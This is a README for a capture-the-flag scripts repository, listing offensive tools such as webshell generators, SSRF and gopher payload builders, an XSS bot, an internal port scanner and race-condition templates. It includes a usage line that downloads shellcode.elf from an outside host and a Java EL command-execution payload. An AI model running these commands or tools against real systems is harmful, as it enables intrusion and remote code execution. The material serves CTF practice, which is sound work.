# CTF-Scripts

## 目录结构
```
.
├── README.md
├── dockers
│   └── docker_php_debug
│       ├── README.md
│       ├── docker-compose.yml
│       ├── logs
│       │   └── nginx
│       │       ├── access.log
│       │       ├── error.log
│       │       ├── info.log
│       │       └── notice.log
│       ├── mysql
│       │   ├── Dockerfile
│       │   ├── db.sql
│       │   └── xyhcms.sql
│       ├── nginx
│       │   ├── Dockerfile
│       │   ├── nginx.conf
│       │   └── templates
│       │       └── default.conf.template
│       ├── php-fpm
│       │   ├── Dockerfile
│       │   ├── mongodb-1.14.1.tgz
│       │   ├── www.conf
│       │   ├── xdebug-3.1.5.tgz
│       │   └── xdebug.ini
│       └── source
│           └── test.php
├── javascript
│   ├── node-ssrf-split.js
│   ├── port-scan.js
│   ├── test.js
│   └── xss-bot.js
├── misc
│   ├── UploadServer.py
│   ├── compress-zlib.py
│   ├── download.sh
│   └── hae
│       ├── Config.yml
│       ├── Rules.yml
│       └── readme.md
├── php
│   ├── calcSig.py
│   ├── ffi-leak.php
│   ├── geneshell.php
│   ├── geneshell2.php
│   └── serialize.php
├── thread
│   ├── contend.py
│   └── contend2.py
└── transform
    ├── convert2javabytes.py
    ├── encoding.js
    ├── gopher.py
    ├── gopher2mysql
    ├── gopher2mysql.py
    └── gopherConvert.py
```

## 文件说明

|  文件名 | 文件说明  |
|---|---|
|  encoding.js |  JS8/16进制/Unicode标准格式转换 |
|  node-ssrf-split.js | node<=8.0 http.get拆分请求构造，对于生成的数据进行encodeUR操作即可  |
|  port-scan.js | JS探测内网主机端口/内网主机  |
|  xss-bot.js | XSS机器人  |
|  serialize.php | 对于private/protected属性，序列化后S类型转换(截取phpgcc部分功能)  |
| geneshell.php  | 生成无字母webshell的字母部分，用法见p神：[无字母数字的webshell](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html#_4)  |
| geneshell2.php  |  另一种无字母Shell生成函数，无短标签  |
|  compress-zlib.php | file_get_contents生成本地临时文件，使用socket原生套接字改写Http请求&响应包。双线程发送http请求，参考36c3 CTF includer:[includer](https://ljdd520.github.io/2020/01/15/hxp-36c3-ctf-Web-%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/)  |
|  ffi-leak.php | PHP7.4 FFI extension use to leak data，来源：[@cjm00n](https://cjm00n.top/CTF/tctf-2020-wp.html)  |
|  calcSig.py | 根据内容计算phar的签名，生成新的phar文件  |
| gopherConvert.py  | wireshark网卡数据包转gopher数据形式  |
| gopher.py  | 生成post的gopher数据报文  |
|  gopher2mysql.py | 生成与mysql交互的gopher数据报文  |
| UploadServer.py  | 以当前目录，快速启动一个带有文件上传/下载功能代理服务器. Usage: python2 UploadServer.py 8888  |
| download.sh  | 无curl或wget情况的http下载文件请求，Usage：download.sh http://hpdoger.cn:8888/shellcode.elf > shellcode.elf  |
|contend.py |threading条件竞争模版，用来竞争php sess文件 |
| contend2.py|比较优雅的进行条件竞争模版，来自@P神 |
|convert2javabytes.py |转字符串为16进制字节码，方便java中的命令执行例如EL表达式：${T(java.lang.Runtime).getRuntime().exec(new String(new byte[]{0x6f,0x70,0x65,0x6e,0x20,0x2d,0x61,0x20,0x43,0x61,0x6c,0x63,0x75,0x6c,0x61,0x74,0x6f,0x72}))} |
| c\perl交互readflag脚本| [readflag](https://github.com/ZeddYu/ReadFlag)|
| docker_php_debug| docker远程调试php板子，mysql+nginx+php-fpm+xdebug|
| misc/hae/Rules.yaml| Hae高亮规则，参考[Hae Repo](https://github.com/gh0stkey/HaE)|
